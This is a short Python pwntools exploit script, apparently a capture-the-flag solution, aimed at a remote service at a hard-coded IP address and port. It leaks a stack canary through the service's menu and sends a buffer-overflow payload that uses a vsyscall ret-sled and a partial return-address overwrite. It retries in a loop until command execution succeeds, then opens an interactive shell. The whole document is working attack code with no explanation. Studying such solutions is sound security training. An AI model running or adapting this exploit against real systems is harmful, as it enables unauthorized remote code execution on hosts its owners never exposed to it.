from pwn import *

context.log_level = 'debug'
context.terminal = ['tmux', 'splitw', '-h']

while True:
#if True:
    try:
        #r = process('./a.out')#,env={'LD_PRELOAD':'./libc.so.6'})
        r = remote('118.31.17.25', 20011)
        #gdb.attach(r,'')
        r.recvuntil('> ')
        r.sendline('a')
        r.recvuntil('> ')
        r.sendline('b')
        r.recvuntil('> ')
        r.sendline('a')
        r.recvuntil('> ')
        r.sendline('g')
        canary = r.recv(32)[16:].decode('hex')
        print canary.encode('hex')
        payload  = 'aaaaaaaa'
        payload += '\x00' * 0x100
        payload += canary
        payload += 'cccccccc'
        payload += p64(0xffffffffff600000) * 18
        payload += '\x74\xe2'
        #payload += p64(0x555555554b00)
        r.recvuntil('> ')
        r.sendline('b')
        r.sendline(payload)
        r.recvuntil('> ')
        r.sendline('d')
        r.recvuntil('?')
        r.sendline('n')
        #r.interactive()
        r.sendline('id;echo "bigtang"')
        data = r.recvuntil('bigtang',timeout=1)
        print data
        #exit()
        r.interactive()
    except Exception as e:
        print e
        r.close()
